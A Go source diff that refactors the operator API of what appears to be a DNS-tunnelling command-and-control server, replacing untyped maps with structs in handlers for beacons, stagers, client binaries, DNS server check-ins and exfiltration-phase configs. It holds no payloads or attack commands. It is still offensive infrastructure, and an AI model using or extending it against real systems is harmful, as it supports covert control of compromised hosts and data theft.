@@ -855,7 +855,7 @@ func (api *APIServer) handleChangePassword(w http.ResponseWriter, r *http.Reques
 		}
 
 		// Verify current password
-		_, _, err = api.db.VerifyOperatorCredentials(operator["username"].(string), req.CurrentPassword)
+		_, _, err = api.db.VerifyOperatorCredentials(operator.Username, req.CurrentPassword)
 		if err != nil {
 			api.sendError(w, http.StatusUnauthorized, "current password is incorrect")
 			return
@@ -909,7 +909,7 @@ func (api *APIServer) handleDeleteOperator(w http.ResponseWriter, r *http.Reques
 
 	// Log audit event
 	api.db.LogAuditEvent(currentOperatorID, "operator_deleted", "operator", operatorID,
-		fmt.Sprintf("Deleted operator: %s", operator["username"]), r.RemoteAddr)
+		fmt.Sprintf("Deleted operator: %s", operator.Username), r.RemoteAddr)
 
 	api.sendSuccess(w, "operator deleted successfully", nil)
 }
@@ -961,7 +961,7 @@ func (api *APIServer) handleToggleOperatorStatus(w http.ResponseWriter, r *http.
 		status = "enabled"
 	}
 	api.db.LogAuditEvent(currentOperatorID, "operator_status_changed", "operator", operatorID,
-		fmt.Sprintf("%s operator: %s", status, operator["username"]), r.RemoteAddr)
+		fmt.Sprintf("%s operator: %s", status, operator.Username), r.RemoteAddr)
 
 	api.sendSuccess(w, fmt.Sprintf("operator %s successfully", status), nil)
 }
@@ -1002,7 +1002,7 @@ func (api *APIServer) handleDNSServerCheckin(w http.ResponseWriter, r *http.Requ
 	pendingCaches, err := api.db.GetPendingStagerCaches(dnsServerID)
 	if err != nil {
 		fmt.Printf("[API] Warning: Failed to get pending caches for %s: %v\n", dnsServerID, err)
-		pendingCaches = []map[string]interface{}{} // Continue with empty list
+		pendingCaches = []PendingStagerCache{}
 	}
 
 	// Build response with cache tasks
@@ -1011,11 +1011,11 @@ func (api *APIServer) handleDNSServerCheckin(w http.ResponseWriter, r *http.Requ
 
 	for _, cache := range pendingCaches {
 		cacheTasks = append(cacheTasks, map[string]interface{}{
-			"client_binary_id": cache["client_binary_id"],
-			"total_chunks":     cache["total_chunks"],
-			"chunks":           cache["chunks"],
+			"client_binary_id": cache.ClientBinaryID,
+			"total_chunks":     cache.TotalChunks,
+			"chunks":           cache.Chunks,
 		})
-		cacheIDs = append(cacheIDs, cache["id"].(int))
+		cacheIDs = append(cacheIDs, cache.ID)
 	}
 
 	// Mark caches as delivered
@@ -1082,7 +1082,7 @@ func (api *APIServer) handleDNSServerCheckin(w http.ResponseWriter, r *http.Requ
 	buildPhaseConfigs, bpcErr := api.db.GetBuildPhaseConfigs()
 	if bpcErr != nil {
 		fmt.Printf("[API] Warning: Failed to get build phase configs: %v\n", bpcErr)
-		buildPhaseConfigs = map[string]map[string]interface{}{}
+		buildPhaseConfigs = map[string]BuildPhaseConfig{}
 	}
 
 	// Send response with pending caches and domain updates
@@ -1127,11 +1127,7 @@ func (api *APIServer) getDNSServerDomain(serverID string) string {
 	api.dnsServerDomainCacheMu.Lock()
 	api.dnsServerDomainCache = make(map[string]string)
 	for _, server := range servers {
-		if id, ok := server["id"].(string); ok {
-			if domain, ok := server["domain"].(string); ok {
-				api.dnsServerDomainCache[id] = domain
-			}
-		}
+		api.dnsServerDomainCache[server.ID] = server.Domain
 	}
 	api.dnsServerDomainCacheTime = time.Now()
 	domain, ok := api.dnsServerDomainCache[serverID]
@@ -1166,16 +1162,14 @@ func (api *APIServer) handleBeaconReport(w http.ResponseWriter, r *http.Request)
 	// Check if beacon_name is actually a build ID
 	var resolvedBuildID string
 	if req.Beacon.BeaconName != "" {
-		if buildConfig, _ := api.db.GetBuildConfigByBuildID(req.Beacon.BeaconName); buildConfig != nil {
+		if buildConfig, _ := api.db.GetBuildConfigByBuildID(req.Beacon.BeaconName); buildConfig.BinaryID != "" {
 			resolvedBuildID = req.Beacon.BeaconName
-			// Restore original beacon name from build config if available
-			if origName, ok := buildConfig["beacon_name"].(string); ok && origName != "" {
+			if origName, _ := buildConfig.Extra["beacon_name"].(string); origName != "" {
 				req.Beacon.BeaconName = origName
 			} else {
 				req.Beacon.BeaconName = ""
 			}
-			// Resolve payload format and encoding from build config
-			if pf, ok := buildConfig["payload_format"].(string); ok && pf != "" && req.Beacon.PayloadFormat == "" {
+			if pf, _ := buildConfig.Extra["payload_format"].(string); pf != "" && req.Beacon.PayloadFormat == "" {
 				req.Beacon.PayloadFormat = pf
 			}
 			if api.config.Debug {
@@ -1248,11 +1242,11 @@ func (api *APIServer) handleBeaconReport(w http.ResponseWriter, r *http.Request)
 
 	// Include phase config from build config so DNS server can cache per-beacon IPs
 	if resolvedBuildID != "" {
-		if buildConfig, _ := api.db.GetBuildConfigByBuildID(resolvedBuildID); buildConfig != nil {
+		if buildConfig, _ := api.db.GetBuildConfigByBuildID(resolvedBuildID); buildConfig.BinaryID != "" {
 			phaseConfig := map[string]interface{}{}
 			hasPhase := false
 
-			if regPhase, ok := buildConfig["registration_phase"].(map[string]interface{}); ok {
+			if regPhase, ok := buildConfig.Extra["registration_phase"].(map[string]interface{}); ok {
 				if qt, ok := regPhase["query_type"].(string); ok {
 					phaseConfig["reg_query_type"] = qt
 				}
@@ -1264,7 +1258,7 @@ func (api *APIServer) handleBeaconReport(w http.ResponseWriter, r *http.Request)
 				}
 				hasPhase = true
 			}
-			if pollPhase, ok := buildConfig["poll_phase"].(map[string]interface{}); ok {
+			if pollPhase, ok := buildConfig.Extra["poll_phase"].(map[string]interface{}); ok {
 				if qt, ok := pollPhase["query_type"].(string); ok {
 					phaseConfig["poll_query_type"] = qt
 				}
@@ -1282,7 +1276,7 @@ func (api *APIServer) handleBeaconReport(w http.ResponseWriter, r *http.Request)
 				}
 				hasPhase = true
 			}
-			if exfilPhase, ok := buildConfig["data_exfil_phase"].(map[string]interface{}); ok {
+			if exfilPhase, ok := buildConfig.Extra["data_exfil_phase"].(map[string]interface{}); ok {
 				if qt, ok := exfilPhase["query_type"].(string); ok {
 					phaseConfig["exfil_query_type"] = qt
 				}
@@ -1423,15 +1417,14 @@ func (api *APIServer) handleGetBeacon(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	if beacon == nil {
+	if beacon.ID == "" {
 		api.sendError(w, http.StatusNotFound, "beacon not found")
 		return
 	}
 
-	// Augment with build config if beacon has a build ID
-	if bid, ok := beacon["build_id"].(string); ok && bid != "" {
-		if buildConfig, err := api.db.GetBuildConfigByBuildID(bid); err == nil && buildConfig != nil {
-			beacon["build_config"] = buildConfig
+	if beacon.BuildID != "" {
+		if buildConfig, err := api.db.GetBuildConfigByBuildID(beacon.BuildID); err == nil && buildConfig.BinaryID != "" {
+			beacon.BuildConfig = &buildConfig
 		}
 	}
 
@@ -1448,23 +1441,22 @@ func (api *APIServer) handleGetBeaconBuildConfig(w http.ResponseWriter, r *http.
 		api.sendError(w, http.StatusInternalServerError, "failed to retrieve beacon")
 		return
 	}
-	if beacon == nil {
+	if beacon.ID == "" {
 		api.sendError(w, http.StatusNotFound, "beacon not found")
 		return
 	}
 
-	bid, _ := beacon["build_id"].(string)
-	if bid == "" {
+	if beacon.BuildID == "" {
 		api.sendJSON(w, map[string]interface{}{"message": "no build ID associated"})
 		return
 	}
 
-	buildConfig, err := api.db.GetBuildConfigByBuildID(bid)
+	buildConfig, err := api.db.GetBuildConfigByBuildID(beacon.BuildID)
 	if err != nil {
 		api.sendError(w, http.StatusInternalServerError, "failed to retrieve build config")
 		return
 	}
-	if buildConfig == nil {
+	if buildConfig.BinaryID == "" {
 		api.sendJSON(w, map[string]interface{}{"message": "build config not found"})
 		return
 	}
@@ -1549,21 +1541,17 @@ func (api *APIServer) handleGetBeaconDomains(w http.ResponseWriter, r *http.Requ
 	// Build set of domains already tracked by this beacon
 	existingDomains := make(map[string]bool)
 	for _, d := range domains {
-		if domain, ok := d["domain"].(string); ok {
-			existingDomains[domain] = true
-		}
+		existingDomains[d.Domain] = true
 	}
 
 	// Add any DNS server domains not already tracked as unchecked entries
 	allServers, _ := api.db.GetDNSServers()
 	for _, server := range allServers {
-		if domain, ok := server["domain"].(string); ok {
-			if !existingDomains[domain] {
-				domains = append(domains, map[string]interface{}{
-					"domain": domain,
-					"active": false,
-				})
-			}
+		if !existingDomains[server.Domain] {
+			domains = append(domains, BeaconDomain{
+				Domain: server.Domain,
+				Active: false,
+			})
 		}
 	}
 
@@ -1775,7 +1763,7 @@ func (api *APIServer) handleGetTask(w http.ResponseWriter, r *http.Request) {
 	}
 
 	if api.config.Debug {
-		fmt.Printf("[API] Task details retrieved: %s (status: %s)\n", taskID, task["status"])
+		fmt.Printf("[API] Task details retrieved: %s (status: %s)\n", taskID, task.Status)
 	}
 
 	api.sendJSON(w, task)
@@ -1799,7 +1787,7 @@ func (api *APIServer) handleGetTaskStatus(w http.ResponseWriter, r *http.Request
 
 	// Return just the status
 	api.sendJSON(w, map[string]interface{}{
-		"status": task["status"],
+		"status": task.Status,
 	})
 }
 
@@ -1963,8 +1951,8 @@ func (api *APIServer) handleDNSServerRegistration(w http.ResponseWriter, r *http
 	// Extract domain list
 	domains := make([]string, 0, len(servers))
 	for _, server := range servers {
-		if domain, ok := server["domain"].(string); ok && domain != "" {
-			domains = append(domains, domain)
+		if server.Domain != "" {
+			domains = append(domains, server.Domain)
 		}
 	}
 
@@ -2006,9 +1994,7 @@ func (api *APIServer) handleGetTaskStatusesForDNSServer(w http.ResponseWriter, r
 	if len(tasks) > 0 {
 		taskIDs := make([]string, 0, len(tasks))
 		for _, task := range tasks {
-			if id, ok := task["id"].(string); ok {
-				taskIDs = append(taskIDs, id)
-			}
+			taskIDs = append(taskIDs, task.TaskID)
 		}
 		if err := api.db.MarkTasksAsSynced(dnsServerID, taskIDs); err != nil {
 			fmt.Printf("[API] Warning: failed to mark tasks as synced for %s: %v\n", dnsServerID, err)
@@ -2734,7 +2720,7 @@ func (api *APIServer) handleListClientBinaries(w http.ResponseWriter, r *http.Re
 	fmt.Printf("[API] Returning %d client binaries from database\n", len(binaries))
 
 	if len(binaries) == 0 {
-		binaries = []map[string]interface{}{} // Return empty array instead of null
+		binaries = []ClientBinary{}
 	}
 
 	api.sendJSON(w, binaries)
@@ -2992,10 +2978,8 @@ func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, s
 	var dnsDomains []string
 	if err == nil {
 		for _, server := range dnsServers {
-			if status, ok := server["status"].(string); ok && status == "active" {
-				if domain, ok := server["domain"].(string); ok {
-					dnsDomains = append(dnsDomains, domain)
-				}
+			if server.Status == "active" && server.Domain != "" {
+				dnsDomains = append(dnsDomains, server.Domain)
 			}
 		}
 	}
@@ -3075,13 +3059,9 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 	var dnsServerIDs []string
 	var dnsDomains []string
 	for _, server := range dnsServers {
-		status, _ := server["status"].(string)
-		if status == "active" {
-			if id, ok := server["id"].(string); ok {
-				domain, _ := server["domain"].(string)
-				dnsServerIDs = append(dnsServerIDs, id)
-				dnsDomains = append(dnsDomains, domain)
-			}
+		if server.Status == "active" {
+			dnsServerIDs = append(dnsServerIDs, server.ID)
+			dnsDomains = append(dnsDomains, server.Domain)
 		}
 	}
 
